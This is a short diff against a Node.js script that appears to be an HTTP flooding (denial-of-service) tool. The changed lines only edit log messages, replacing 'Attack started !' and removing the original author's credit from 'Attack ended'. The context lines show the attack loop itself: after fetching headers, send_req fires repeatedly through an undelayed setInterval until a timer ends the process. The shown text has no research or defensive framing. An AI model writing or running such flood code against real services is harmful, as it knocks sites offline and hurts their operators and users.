@@ -66,7 +66,7 @@ function send_req(headers) {
 
 let init = function () {
     getHeaders().then(function (result) {
-        console.log('Attack started !');
+        console.log('[×] Attack started !');
         setInterval(() => {
             send_req(result);
         });
@@ -74,7 +74,7 @@ let init = function () {
 };
 
 setTimeout(() => {
-    console.log('Attack ended. Thanks for use my script DagTriZaker <3');
+    console.log('[×] Attack ended.');
     process.exit(0)
 }, time * 1000);
 
